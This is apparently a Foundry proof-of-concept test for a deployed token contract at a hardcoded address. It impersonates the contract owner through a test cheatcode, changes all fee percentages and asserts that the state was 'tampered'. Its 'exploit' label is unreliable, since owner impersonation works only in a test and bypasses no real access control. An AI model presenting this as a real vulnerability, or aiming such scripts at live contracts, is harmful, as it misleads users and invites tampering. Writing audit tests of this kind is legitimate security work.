pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Itend {
    function owner() external view returns (address);
    function setAllFeePercent(uint8 taxFee, uint8 liquidityFee, uint8 burnFee, uint8 walletFee, uint8 buybackFee) external;
    function _taxFee() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x222f737285D0B60d8D4f27fA22cE8884c9F119F8;
    address attacker = address(this);
    Itend tend;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        tend = Itend(TARGET);
        owner = tend.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
                tend.setAllFeePercent(10, 10, 10, 10, 10);
                vm.stopPrank();
        assertEq(tend._taxFee(), 10, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
